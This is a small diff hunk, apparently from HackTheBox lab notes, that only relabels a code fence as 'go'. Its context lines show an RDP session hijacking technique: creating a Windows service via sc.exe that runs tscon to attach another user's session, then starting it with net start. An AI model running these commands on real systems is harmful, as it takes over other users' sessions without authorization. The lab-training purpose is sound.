@@ -114,7 +114,7 @@ C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#1
 ```
 
 Now run the command:
-```
+```go
 C:\htb> net start sessionhijack
 ```
 
